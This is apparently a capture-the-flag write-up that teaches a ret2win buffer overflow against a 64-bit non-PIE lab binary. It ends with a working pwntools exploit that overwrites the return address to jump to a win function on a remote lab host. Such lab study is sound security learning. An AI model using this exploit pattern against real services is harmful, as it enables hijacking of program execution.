This is about the basics of binary exploitation using ret2win attack.

The challenge presents us with a vuln binary which is 64 bit as evident from the `file` command and the checksec shows that exposes NO PIE and NX bit set. 

1. Fixed Memory Addresses

-> With PIE: The operating system loads the program into a random location in memory every single time it runs (a security feature known as ASLR—Address Space Layout Randomization).   

-> With no PIE: The program is compiled to be loaded at a fixed, hardcoded memory address every time it runs.

2. Security Implications

-> Lower Security: Because no PIE binaries load at predictable, static memory addresses, they are generally more vulnerable to certain types of memory exploitation (such as buffer overflows or return-oriented programming / ROP attacks), assuming other mitigations aren't bypassing it. Attackers can easily hardcode exact memory addresses for functions or gadgets.

-> Why it exists: Some older software, specific performance-critical applications, or certain debugging/reversing workflows require non-PIE binaries because managing fixed addresses simplifies how code interacts with memory.

When we analyze the source code we notice that the read function takes in 128 bytes but the buf is just 32 bytes which means there is a buffer overflow vulnerability. 
When we analyze the binary using gdb we notice that the registers are 64 bits (thats why it is a 64-bit binary) but the thing to notice is that x64 v/s x86: x64 elfs have registers with r as in rip (instruction pointer 64-bit) while the x86 elfs will have registers with e as in eip (instruction pointer 32-bit). 

Now the task is to overwrite the return address (classic ret2win exploit)

from pwn import *

HOST = "xebec.cylabacademy.net"
PORT = 33684

p = remote(HOST,PORT)

p.recvuntil(b"Please enter your name: ")

offset = 40

win_addr = 0x401256

payload = b"A" * offset + p64(win_addr)

p.sendline(payload)
p.interactive()
